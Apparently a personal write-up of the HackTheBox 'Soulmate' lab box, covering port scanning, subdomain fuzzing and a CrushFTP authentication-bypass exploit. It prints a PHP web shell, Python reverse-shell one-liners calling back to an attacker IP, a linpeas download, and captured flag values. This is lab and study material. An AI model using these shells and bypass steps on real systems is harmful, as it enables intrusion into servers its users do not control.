@@ -1,0 +1,229 @@
+# Nmap
+┌──(kali㉿kali)-[~/HackTheBox/Soulmate]
+└─$ nmap -p22,80 -sC -A 10.10.11.86 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 10:40 EDT
+Nmap scan report for soulmate.htb (10.10.11.86)
+Host is up (0.61s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Soulmate - Find Your Perfect Match
+
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 5.0 - 5.14 (96%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (96%), Linux 4.15 - 5.19 (96%), Linux 5.4 - 5.10 (95%), Linux 2.6.32 - 3.5 (93%), HP P2000 G3 NAS device (93%), Linux 2>
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   781.27 ms 10.10.14.1
+2   782.54 ms soulmate.htb (10.10.11.86)
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#examining source code
+<!--GSIGNIN_SCRIPT--><!--MSSIGNIN_SCRIPT--><!--AZURE_B2C_SINGIN_SCRIPT--><!--AMAZON_COGNITO_SINGIN_SCRIPT--><!--SAML_SIGNIN_SCRIPT--><!--OIDC_SIGNIN_SCRIPT--><!--##COVERIMAGEPATH##--><script></script><script >
+ src="/WebInterface/new-ui/assets/js/thirdparty/Reqwest/reqwest.js?v=11.W.657-2025_03_08_07_52"></script><script>...
+ 
+ # we found the version number...
+v=11.W.657-2025_03_08_07_52
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+# Meta-Sploit
+(Failed attempts honestly…)
+*** doing a search ***
+──(kali㉿kali)-[~/HackTheBox/Soulmate]
+└─$ searchsploit crush ftp
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----->
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----->
+Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)                                                                                                                                                | wind>
+CrushFTP 11.3.1 - Authentication Bypass                                                                                                                                                                   | mult>
+CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                                                                                                                 | mult>
+CrushFTP < 11.1.0 - Directory Traversal                                                                                                                                                                   | mult>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----->
+Shellcodes: No Results
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+*** metasploit ***
+using...
+
+   Name        Current Setting          Required  Description
+   ----        ---------------          --------  -----------
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS      ftp.soulmate.htb         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT       80                       yes       The target port (TCP)
+   SSL         false                    no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /WebInterface/function/  yes       The URI path to CrushFTP
+   TARGETUSER  crushadmin               yes       The target account to forge a session cookie for
+   VHOST       ftp.soulmate.htb         no        HTTP server virtual host
+View the full module info with the info, or info -d command.
+
+we got...
+msf6 auxiliary(gather/crushftp_authbypass_cve_2025_2825) > run
+[*] Running module against 10.10.11.86
+[*] Confirming the target is a CrushFTP web service
+[*] Attempting to bypass authentication
+[-] Auxiliary aborted due to failure: not-vulnerable: The target unexpectedly returned a response
+[*] Auxiliary module execution completed
+Found : module doesn't work properly on htb boxes
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+# DirSearch
+(not much useful...)
+Target: http://soulmate.htb/
+[10:46:36] Starting:
+[10:49:14] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/
+[10:49:14] 403 -  564B  - /assets/
+[10:49:59] 302 -    0B  - /dashboard.php  ->  /login
+[10:51:22] 200 -    8KB - /login.php
+[10:51:24] 302 -    0B  - /logout.php  ->  login.php
+[10:52:34] 302 -    0B  - /profile.php  ->  /login
+[10:52:45] 200 -   11KB - /register.php
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+# FFUF
+> I ran a lot of time consuming large directory enumeration only to get sucess by a small one. 
+> └─$ ffuf -u [http://FUZZ.soulmate.htb/](http://fuzz.soulmate.htb/) -H "Host:FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 400,404 -t 100
+> 
+
+> Correct Syntax
+> └─$ ffuf -u http://soulmate.htb/ -H "Host:FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 400,404 -t 100
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+(took me fricking 45 minutes to figure that out...)but this worked
+──(kali㉿kali)-[~/HackTheBox/Soulmate]
+└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://soulmate.htb/ -H "Host: FUZZ.soulmate.htb" --fs 154
+
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://soulmate.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.soulmate.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 154
+________________________________________________
+ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 594ms]
+Today i understood that using filter size is so much better (crying in corner.)
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#now we use go in manually
+
+We find a github exploit  in GHBD and asked chat gpt to minimize the code
+//The first code didn't work and returned this error:
+[+] Probing https://ftp.soulmate.htb:80
+[!] Probe request failed: HTTPSConnectionPool(host='ftp.soulmate.htb', port=80): Max retries exceeded with>
+[!] Probe did not return expected success (target may not be vulnerable). Aborting.
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+//This error resolved when we tried  HTTPS first and then HTTP, my guess the initial script failed because it was using only https
+
+The correct script:
+#!/usr/bin/env python3
+"""
+crushftp_exploit_fixed.py
+Usage examples:
+  python3 crushftp_exploit_fixed.py --target 10.10.11.86 --port 443 --user soulmate_admin --pass 'P@ssw0rd>
+  python3 crushftp_exploit_fixed.py --target 10.10.11.86 --port 80 --scheme http --user soulmate_admin --p>
+  python3 crushftp_exploit_fixed.py --target ftp.soulmate.htb --port 8080 --scheme auto --user soulmate_ad>
+"""
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+//the syntax:
+┌──(kali㉿kali)-[~/HackTheBox/Soulmate]
+└─$  python3 crushftp2_exploit.py --target ftp.soulmate.htb --port 80 \
+  --user soulmate_admin --pass 'P@ssw0rd123'
+
+output:
+[+] Probing https://ftp.soulmate.htb:80
+[!] Probe request failed: HTTPSConnectionPool(host='ftp.soulmate.htb', port=80): Max retries exceeded with...
+[-] Probe against https://ftp.soulmate.htb:80 did not indicate vuln (or connection failed).
+[+] Probing http://ftp.soulmate.htb:80
+[>] Probe http://ftp.soulmate.htb:80 HTTP 200
+[+] http://ftp.soulmate.htb:80 looks promising. Attempting to create admin 'soulmate_admin'
+[>] Create-admin http://ftp.soulmate.htb:80 HTTP 200
+[+] Success — try login at http://ftp.soulmate.htb:80 with soulmate_admin:P@ssw0rd123
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#having problems because i realized this script is making my newly created user not admin but a normal user so i had to use another script
+https://github.com/ghostsec420/ShatteredFTP/blob/main/Shattered.py  
+We used this exploit ^
+
+Syantax:
+python3 exploit.py --target_host <TARGET_IP> --port 8080 --cve 2825
+
+the builtin defaults are:
+Username: AuthBypassAccount
+Password: CorrectHorseBatteryStaple
+(this can be changed if you made modification to the script...)
+
+From the line:
+parser.add_argument("--new_user", help="New user to create", default="AuthBypassAccount")
+parser.add_argument("--password", help="Password for the new user", default="CorrectHorseBatteryStaple")
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#got a cmd shell through:
+<?php
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+//Request
+http://soulmate.htb/cmd.php?cmd=id
+//Response
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+got a reverse shell on nc with:
+python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.205',4444));os.dup2(s.fileno>
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.205',4444));os.dup2(s.filen>
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+//response
+┌──(kali㉿kali)-[~/HackTheBox/Soulmate/ShatteredFTP]
+└─$ pwncat -l 4444
+ls
+assets
+cmd.php
+dashboard.php
+index.php
+login.php
+logout.php
+profile.php
+register.php
+pwd
+/var/www/soulmate.htb/public
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+//now I'll need to pirv.esc from:
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+#running linpeas we find some interesrting vectors which is in an output file not shown here
+
+ Credentials
+ben :  House-------s998
+
+ssh
+ben@soulmate:~$ ls
+user.txt
+ben@soulmate:~$ cat user.txt
+cf45746b0d84eb6fda1f18e54c75a0c9
+ben@soulmate:~$
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________
+Root Flag Retrieval
+(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
+erlang
+Output:
+[...root_flag...]
